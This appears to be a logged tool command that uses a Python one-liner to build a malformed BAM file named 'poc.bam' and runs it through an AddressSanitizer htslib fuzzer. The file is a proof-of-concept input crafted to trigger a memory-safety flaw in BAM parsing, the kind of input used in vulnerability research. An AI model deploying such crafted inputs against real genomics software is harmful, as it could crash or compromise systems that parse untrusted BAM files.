Command `cd /tmp && python3 -c "
import struct
def build_bam():
    out = b''
    out += b'BAM\x01'
    text = b''
    out += struct.pack('<i', len(text)) + text
    out += struct.pack('<i', 0)  # n_ref
    tid=0; pos=0; binv=0; qual=0; l_qname=4; flag=0; n_cigar=1; l_qseq=10; mtid=-1; mpos=-1; isize=0
    l_extranul = (4 - l_qname%4)%4
    qname = b'AAAA'
    cigar = struct.pack('<I', (5<<4)|0)
    seq = b'\xff'*((l_qseq+1)//2)
    qualb = b'\xff'*l_qseq
    aux = b'\xff'*9
    block_len = 32 + l_qname + l_extranul + n_cigar*4 + (l_qseq+1)//2 + l_qseq + len(aux)
    print('block_len', block_len, 'new_l_data', block_len-32+l_extranul)
    core = struct.pack('<8i', tid,pos,(binv<<16)|(qual<<8)|l_qname,(flag<<16)|n_cigar,l_qseq,mtid,mpos,isize)
    out += struct.pack('<i', block_len) + core + qname + b'\x00'*l_extranul + cigar + seq + qualb + aux
    return out
data = build_bam()
open('poc.bam','wb').write(data)
print('wrote', len(data), 'bytes')
" && ASAN_OPTIONS=detect_leaks=0 /tmp/hts_open_fuzzer /tmp/poc.bam 2>&1 | head -25` executed with exit code 0.
